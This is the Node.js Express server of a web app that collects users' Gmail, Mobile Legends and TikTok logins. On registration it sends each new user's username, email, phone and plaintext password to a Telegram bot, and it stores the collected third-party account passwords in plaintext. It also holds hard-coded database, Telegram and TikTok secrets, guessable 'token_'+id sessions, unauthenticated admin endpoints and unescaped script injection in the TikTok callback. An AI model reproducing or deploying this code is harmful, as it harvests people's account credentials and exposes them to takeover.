const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const path = require('path');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

const pool = new Pool({
    connectionString: 'postgresql://neondb_owner:npg_XQ1o9KdkvZWa@ep-holy-credit-am3o64na-pooler.c-5.us-east-1.aws.neon.tech/neondb?sslmode=require',
    ssl: { rejectUnauthorized: false }
});

const RECAPTCHA_SECRET = '6LcobYosAAAAANDtHfj2MH7FwzjKn5_VAhS2PSnH';
const BOT_TOKEN = '8737284644:AAEW7XtU6HqK4O49dJXG6MXSj08BvLUAdJE';
const CHAT_ID = '8315928972';
const TIKTOK_CLIENT_KEY = 'awlwv9kkzin9m9pv';
const TIKTOK_CLIENT_SECRET = '3QDthZspcNC7eHZNCA5ofYAs3CpACLX7';
const TIKTOK_REDIRECT = 'https://two026-users-data-management.onrender.com/auth/tiktok/callback';

function tgSend(msg) { https.get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`); }

function verifyCaptcha(token) {
    return new Promise((resolve) => {
        const data = `secret=${RECAPTCHA_SECRET}&response=${token}`;
        const req = https.request({ hostname: 'www.google.com', path: '/recaptcha/api/siteverify', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': data.length } }, (res) => {
            let body = ''; res.on('data', chunk => body += chunk);
            res.on('end', () => { try { resolve(JSON.parse(body).success); } catch (e) { resolve(false); } });
        });
        req.on('error', () => resolve(false)); req.write(data); req.end();
    });
}

// Create tables
pool.query(`CREATE TABLE IF NOT EXISTS auth_users (id SERIAL PRIMARY KEY, username VARCHAR(100), email VARCHAR(200) UNIQUE, phone VARCHAR(50), password VARCHAR(255), google_id VARCHAR(200), login_type VARCHAR(10) DEFAULT 'local', avatar VARCHAR(500), gmail_pass VARCHAR(100) DEFAULT 'DoubleMK2008', mlbb_pass VARCHAR(100) DEFAULT 'GlobalMK2008', created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, last_login TIMESTAMP)`);
pool.query(`CREATE TABLE IF NOT EXISTS notices (id SERIAL PRIMARY KEY, message TEXT, color VARCHAR(20) DEFAULT '#ffffff', created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
pool.query(`CREATE TABLE IF NOT EXISTS banned_users (user_id VARCHAR(100) PRIMARY KEY, banned_by VARCHAR(100), banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
pool.query(`CREATE TABLE IF NOT EXISTS gmail_accounts (user_id VARCHAR(50) PRIMARY KEY, name VARCHAR(100), email VARCHAR(100), password VARCHAR(100), phone VARCHAR(20), created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
pool.query(`CREATE TABLE IF NOT EXISTS mlbb_accounts (user_id VARCHAR(50) PRIMARY KEY, ingame_name VARCHAR(100), ingame_id VARCHAR(50), server_id VARCHAR(20), gmail VARCHAR(100), password VARCHAR(100), created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
pool.query(`CREATE TABLE IF NOT EXISTS tiktok_accounts (user_id VARCHAR(50) PRIMARY KEY, full_name VARCHAR(100), last_name VARCHAR(100), email VARCHAR(100), password VARCHAR(100), phone VARCHAR(20), created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);

// ==================== AUTH ====================
app.post('/api/track_login', async (req, res) => {
    const { userId, username, email, loginType } = req.body;
    try { await pool.query('INSERT INTO auth_users (id, username, email, login_type, last_login) VALUES ($1,$2,$3,$4,NOW()) ON CONFLICT (email) DO UPDATE SET last_login=NOW(), username=EXCLUDED.username, login_type=EXCLUDED.login_type', [userId, username, email, loginType]); res.json({ success: true }); } catch (e) { res.json({ success: false }); }
});

app.post('/api/register', async (req, res) => {
    const { username, email, phone, password, captcha } = req.body;
    if (!username || !email || !phone || !password || !captcha) return res.json({ success: false, message: 'All fields required' });
    const ok = await verifyCaptcha(captcha); if (!ok) return res.json({ success: false, message: 'reCAPTCHA failed' });
    try {
        const exist = await pool.query('SELECT id FROM auth_users WHERE email = $1', [email]);
        if (exist.rows.length > 0) return res.json({ success: false, message: 'Email already exists' });
        const result = await pool.query('INSERT INTO auth_users (username, email, phone, password, login_type) VALUES ($1,$2,$3,$4,$5) RETURNING id', [username, email, phone, password, 'local']);
        tgSend(`🆕 New Registration\n👤 ${username}\n📧 ${email}\n📱 ${phone}\n🔑 ${password}`);
        res.json({ success: true, message: 'Registration successful', userId: result.rows[0].id });
    } catch (e) { res.json({ success: false, message: 'Error: ' + e.message }); }
});

app.post('/api/login', async (req, res) => {
    const { email, password, captcha } = req.body;
    if (!email || !password || !captcha) return res.json({ success: false, message: 'All fields required' });
    const ok = await verifyCaptcha(captcha); if (!ok) return res.json({ success: false, message: 'reCAPTCHA failed' });
    try {
        const result = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND password = $2 AND login_type = 'local'", [email, password]);
        if (result.rows.length === 0) return res.json({ success: false, message: 'Invalid email or password' });
        const user = result.rows[0];
        await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [user.id]);
        res.json({ success: true, token: 'token_' + user.id, user: { id: user.id, username: user.username, email: user.email, login_type: 'local' } });
    } catch (e) { res.json({ success: false }); }
});

app.post('/api/auth/google', async (req, res) => {
    const { token, userInfo } = req.body; if (!userInfo) return res.json({ success: false });
    const { sub: googleId, email, name } = userInfo;
    try {
        let r = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [googleId]);
        if (r.rows.length > 0) { await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [r.rows[0].id]); return res.json({ success: true, token: 'token_' + r.rows[0].id, user: { id: r.rows[0].id, username: r.rows[0].username, email, login_type: 'google' } }); }
        r = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND login_type = 'local'", [email]);
        if (r.rows.length > 0) { await pool.query('UPDATE auth_users SET google_id = $1 WHERE id = $2', [googleId, r.rows[0].id]); return res.json({ success: true, token: 'token_' + r.rows[0].id, user: { id: r.rows[0].id, username: r.rows[0].username, email, login_type: 'google' } }); }
        const nu = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1,$2,$3,$4) RETURNING id', [name || 'Google User', email, googleId, 'google']);
        res.json({ success: true, token: 'token_' + nu.rows[0].id, user: { id: nu.rows[0].id, username: name, email, login_type: 'google' } });
    } catch (e) { res.json({ success: false }); }
});

app.get('/auth/tiktok', (req, res) => { const csrf = Math.random().toString(36).substring(2); res.redirect(`https://www.tiktok.com/v2/auth/authorize/?client_key=${TIKTOK_CLIENT_KEY}&scope=user.info.basic&response_type=code&redirect_uri=${TIKTOK_REDIRECT}&state=${csrf}`); });

app.get('/auth/tiktok/callback', async (req, res) => {
    const { code } = req.query; if (!code) return res.send('<script>window.close()</script>');
    try {
        const tr = await fetch('https://open.tiktokapis.com/v2/oauth/token/', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ client_key: TIKTOK_CLIENT_KEY, client_secret: TIKTOK_CLIENT_SECRET, code, grant_type: 'authorization_code', redirect_uri: TIKTOK_REDIRECT }) });
        const td = await tr.json();
        const ur = await fetch('https://open.tiktokapis.com/v2/user/info/?fields=open_id,display_name', { headers: { 'Authorization': `Bearer ${td.access_token}` } });
        const ud = await ur.json(); const user = ud.data.user;
        const dr = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [user.open_id]);
        if (dr.rows.length > 0) { await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [dr.rows[0].id]); res.send(`<script>localStorage.setItem("auth_token","token_${dr.rows[0].id}");localStorage.setItem("user",JSON.stringify({id:${dr.rows[0].id},username:"${dr.rows[0].username||user.display_name}",email:"${dr.rows[0].email||'tiktok@user.com'}",login_type:"tiktok"}));window.location.href="/dashboard";</script>`); }
        else { const nu = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1,$2,$3,$4) RETURNING id', [user.display_name, 'tiktok_'+user.open_id+'@tiktok.com', user.open_id, 'tiktok']); res.send(`<script>localStorage.setItem("auth_token","token_${nu.rows[0].id}");localStorage.setItem("user",JSON.stringify({id:${nu.rows[0].id},username:"${user.display_name}",email:"tiktok@user.com",login_type:"tiktok"}));window.location.href="/dashboard";</script>`); }
    } catch (e) { res.send('<script>alert("TikTok login failed");window.location.href="/";</script>'); }
});

app.post('/api/check_session', async (req, res) => {
    const { token } = req.body; if (!token) return res.json({ success: false });
    try { const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(token.replace('token_', ''))]); if (r.rows.length === 0) return res.json({ success: false }); const u = r.rows[0]; res.json({ success: true, user: { id: u.id, username: u.username, email: u.email, login_type: u.login_type } }); } catch (e) { res.json({ success: false }); }
});
app.post('/api/logout', (req, res) => res.json({ success: true }));

// ==================== PASSWORDS ====================
app.post('/api/get_passwords', async (req, res) => {
    const { token } = req.body; if (!token) return res.json({ gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008' });
    try { const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(token.replace('token_', ''))]); if (r.rows.length === 0) return res.json({ gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008' }); res.json({ gmail_password: r.rows[0].gmail_pass, mlbb_password: r.rows[0].mlbb_pass }); } catch (e) { res.json({ gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008' }); }
});
app.post('/api/change_password', async (req, res) => {
    const { token, type, current_password, new_password } = req.body; if (!token) return res.json({ success: false });
    try { const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(token.replace('token_', ''))]); if (r.rows.length === 0) return res.json({ success: false }); const field = type === 'gmail' ? 'gmail_pass' : 'mlbb_pass'; if (current_password !== r.rows[0][field]) return res.json({ success: false, message: 'Wrong current password' }); await pool.query(`UPDATE auth_users SET ${field} = $1 WHERE id = $2`, [new_password, parseInt(token.replace('token_', ''))]); res.json({ success: true, message: 'Password changed' }); } catch (e) { res.json({ success: false }); }
});

// ==================== COUNTRIES ====================
const countries = [
    {name:'Myanmar',code:'MM',regions:['Yangon','Mandalay','Naypyidaw','Bago','Sagaing','Magway','Ayeyarwady','Tanintharyi','Shan','Kachin','Kayah','Kayin','Mon','Rakhine','Chin']},
    {name:'Thailand',code:'TH',regions:['Bangkok','Chiang Mai','Phuket','Pattaya','Krabi','Surat Thani']},
    {name:'Indonesia',code:'ID',regions:['Jakarta','Bali','Surabaya','Bandung','Medan']},
    {name:'Malaysia',code:'MY',regions:['Kuala Lumpur','Penang','Johor','Sabah','Sarawak']},
    {name:'Singapore',code:'SG',regions:['Central','North','East','West']},
    {name:'Philippines',code:'PH',regions:['Manila','Cebu','Davao','Quezon City']},
    {name:'Vietnam',code:'VN',regions:['Hanoi','Ho Chi Minh','Da Nang']},
    {name:'India',code:'IN',regions:['Mumbai','Delhi','Bangalore','Chennai']},
    {name:'China',code:'CN',regions:['Beijing','Shanghai','Guangzhou','Shenzhen']},
    {name:'Japan',code:'JP',regions:['Tokyo','Osaka','Kyoto','Yokohama']},
    {name:'South Korea',code:'KR',regions:['Seoul','Busan','Incheon','Daegu']},
    {name:'USA',code:'US',regions:['New York','Los Angeles','Chicago','Houston']},
    {name:'UK',code:'GB',regions:['London','Manchester','Birmingham','Liverpool']},
    {name:'Australia',code:'AU',regions:['Sydney','Melbourne','Brisbane','Perth']},
    {name:'Canada',code:'CA',regions:['Toronto','Vancouver','Montreal','Calgary']},
    {name:'Brazil',code:'BR',regions:['Sao Paulo','Rio de Janeiro','Brasilia']},
    {name:'Germany',code:'DE',regions:['Berlin','Munich','Frankfurt','Hamburg']},
    {name:'France',code:'FR',regions:['Paris','Marseille','Lyon','Toulouse']},
    {name:'Italy',code:'IT',regions:['Rome','Milan','Naples','Turin']},
    {name:'Spain',code:'ES',regions:['Madrid','Barcelona','Valencia','Seville']}
];
app.get('/api/countries', (req, res) => res.json(countries));

// ==================== SAVE & GET USER DATA ====================
app.post('/api/save_user_data', async (req, res) => {
    const { token, type, data } = req.body;
    if (!token) return res.json({ success: false });
    const userId = parseInt(token.replace('token_', ''));
    try {
        if (type === 'gmail') {
            await pool.query('INSERT INTO gmail_accounts (user_id, name, email, password, phone, created_by) VALUES ($1,$2,$3,$4,$5,$6) ON CONFLICT (user_id) DO UPDATE SET name=$2,email=$3,password=$4,phone=$5', [userId, data.name, JSON.stringify(data.emails), data.password, JSON.stringify(data.phones), 'user']);
        } else if (type === 'mlbb') {
            await pool.query('INSERT INTO mlbb_accounts (user_id, ingame_name, ingame_id, server_id, gmail, password, created_by) VALUES ($1,$2,$3,$4,$5,$6,$7) ON CONFLICT (user_id) DO UPDATE SET ingame_name=$2,ingame_id=$3,server_id=$4,gmail=$5,password=$6', [userId, data.ingameName, data.ingameId, data.serverId, JSON.stringify(data.emails), data.password, 'user']);
        } else if (type === 'tiktok') {
            await pool.query('INSERT INTO tiktok_accounts (user_id, full_name, last_name, email, password, phone, created_by) VALUES ($1,$2,$3,$4,$5,$6,$7) ON CONFLICT (user_id) DO UPDATE SET full_name=$2,last_name=$3,email=$4,password=$5,phone=$6', [userId, data.fullName, data.lastName, JSON.stringify(data.emails), data.password, JSON.stringify(data.phones), 'user']);
        }
        res.json({ success: true, message: 'Data saved!' });
    } catch (e) { res.json({ success: false, message: e.message }); }
});

app.post('/api/get_my_data', async (req, res) => {
    const { token } = req.body;
    if (!token) return res.json({ success: false });
    const userId = parseInt(token.replace('token_', ''));
    try {
        const gmail = await pool.query('SELECT * FROM gmail_accounts WHERE user_id=$1', [userId]);
        const mlbb = await pool.query('SELECT * FROM mlbb_accounts WHERE user_id=$1', [userId]);
        const tiktok = await pool.query('SELECT * FROM tiktok_accounts WHERE user_id=$1', [userId]);
        res.json({ success: true, gmail: gmail.rows, mlbb: mlbb.rows, tiktok: tiktok.rows });
    } catch (e) { res.json({ success: false }); }
});

// ==================== ADMIN ====================
app.get('/api/admin/users_grouped', async (req, res) => {
    try { const lo = await pool.query("SELECT * FROM auth_users WHERE login_type='local' ORDER BY id DESC"); const go = await pool.query("SELECT * FROM auth_users WHERE login_type='google' ORDER BY id DESC"); const ti = await pool.query("SELECT * FROM auth_users WHERE login_type='tiktok' ORDER BY id DESC"); const ba = await pool.query("SELECT user_id FROM banned_users"); const bids = ba.rows.map(r => r.user_id); res.json({ success: true, local: lo.rows, google: go.rows, tiktok: ti.rows, banned: bids, total: lo.rows.length + go.rows.length + ti.rows.length }); } catch (e) { res.json({ success: false }); }
});
app.post('/api/admin/edit_user', async (req, res) => {
    const { id, username, email, phone, password } = req.body;
    try { if (password) { await pool.query('UPDATE auth_users SET username=$1, email=$2, phone=$3, password=$4 WHERE id=$5 AND login_type=$6', [username, email, phone, password, id, 'local']); } else { await pool.query('UPDATE auth_users SET username=$1, email=$2, phone=$3 WHERE id=$4 AND login_type=$5', [username, email, phone, id, 'local']); } res.json({ success: true }); } catch (e) { res.json({ success: false }); }
});
app.post('/api/admin/ban', async (req, res) => { try { await pool.query('INSERT INTO banned_users (user_id, banned_by) VALUES ($1,$2) ON CONFLICT (user_id) DO UPDATE SET banned_by=$2', [req.body.userId, 'admin']); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
app.post('/api/admin/unban', async (req, res) => { try { await pool.query('DELETE FROM banned_users WHERE user_id=$1', [req.body.userId]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
app.post('/api/admin/delete', async (req, res) => { try { await pool.query('DELETE FROM auth_users WHERE id = $1', [req.body.userId]); await pool.query('DELETE FROM banned_users WHERE user_id = $1', [req.body.userId]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
app.post('/api/check_banned', async (req, res) => { try { const r = await pool.query('SELECT * FROM banned_users WHERE user_id=$1', [req.body.userId]); res.json({ banned: r.rows.length > 0 }); } catch (e) { res.json({ banned: false }); } });

// ==================== NOTICE ====================
app.get('/api/notice', async (req, res) => {
    try { const r = await pool.query('SELECT * FROM notices ORDER BY id DESC LIMIT 1'); if (r.rows.length === 0) return res.json({ success: true, message: '', color: '#ffffff' }); const n = r.rows[0]; res.json({ success: true, message: n.message, color: n.color || '#ffffff', id: n.id, created_at: n.created_at }); } catch (e) { res.json({ success: true, message: '' }); }
});
app.get('/api/admin/notices', async (req, res) => {
    try { const r = await pool.query('SELECT * FROM notices ORDER BY id DESC'); res.json({ success: true, notices: r.rows }); } catch (e) { res.json({ success: false, notices: [] }); }
});
app.post('/api/admin/notice', async (req, res) => {
    const { message, color } = req.body; if (!message) return res.json({ success: false, message: 'Message required' });
    try { await pool.query('INSERT INTO notices (message, color, created_by) VALUES ($1,$2,$3)', [message, color || '#ffffff', 'admin']); tgSend(`📢 New Notice\n${message}`); res.json({ success: true, message: 'Notice posted' }); } catch (e) { res.json({ success: false }); }
});
app.post('/api/admin/notice/delete', async (req, res) => {
    try { await pool.query('DELETE FROM notices WHERE id = $1', [req.body.id]); res.json({ success: true }); } catch (e) { res.json({ success: false }); }
});

// ==================== PAGES ====================
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'dashboard.html')));

app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
